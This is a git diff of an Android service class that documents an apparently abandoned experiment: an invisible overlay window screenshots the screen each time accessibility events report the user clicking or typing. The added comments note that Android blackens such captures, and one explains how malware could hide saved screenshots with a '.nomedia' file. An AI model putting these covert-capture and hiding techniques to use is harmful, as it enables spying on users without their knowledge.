@@ -23,7 +23,13 @@ import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 
-
+/**
+ * This class is deprecated
+ * This was my first attempt at capturing the screen where I drew a floating invisible window over everything and took
+ * screenshots from that (because Android, I can only take screenshots of my own app and not outside apps for obvious
+ * reasons). Unfortunately, Android is smart enough to not let me take screenshots from this invisibile floaing window.
+ * I spent a lot of time trying this before moving on to VirtualScreenCaptureService
+ */
 public class DrawScreenService extends Service {
     private static final String TAG = "DrawScreenService";
 
@@ -35,6 +41,10 @@ public class DrawScreenService extends Service {
         return null;
     }
 
+    /* On the creation of the service, we inflate the invisible screen on top of everything. This screen is invisible
+     * and sits on top of everything the user does. Unfortunately, when we try to take a screenshot of this screen,
+     * the screenshot is all black. Android knows to protect against what I'm trying to do
+     */
     @Override
     public void onCreate() {
         super.onCreate();
@@ -68,10 +78,6 @@ public class DrawScreenService extends Service {
                     PixelFormat.TRANSLUCENT);
         }
 
-//        parameters.x = 0;
-//        parameters.y = 50;
-//        parameters.gravity = Gravity.BOTTOM | Gravity.LEFT;
-
         windowManager.addView(floatingDrawnLayout, parameters);
 
         if( floatingDrawnLayout != null ) {
@@ -94,6 +100,10 @@ public class DrawScreenService extends Service {
         }
     }
 
+    /*
+     * Event listener to listen for when the user starts typing. Event notification comes from AccessibilityService.
+     * On notification of the user clicking on something, take a screenshot
+     */
     @Subscribe(threadMode = ThreadMode.BACKGROUND)
     public void onMessageEvent(UserEvents.UserAccessibilityEvent event) {
         /* Do something */
@@ -101,10 +111,15 @@ public class DrawScreenService extends Service {
         takeScreenshot();
     }
 
+    /*
+     * Method takes a screenshot of the current screen (in this case, an invisible screen drawn over whatever the user
+     * is currently doing. The method then saves the screenshot to the device.
+     * If this were actually malware, you could set the app to save the photo to a hidden folder on their device
+     * such that the user would not be able to see that this app is even saving anything. This would be done by adding
+     * a "./nomedia" file to the create folder. I did not do that in this app while I was working for obvious reasons
+     */
     private void takeScreenshot() {
-        View v =
-                floatingDrawnLayout.getRootView();
-//                rootLayout.getRootView();
+        View v = floatingDrawnLayout.getRootView();
 
         v.setDrawingCacheEnabled(true);
         Bitmap b = v.getDrawingCache();
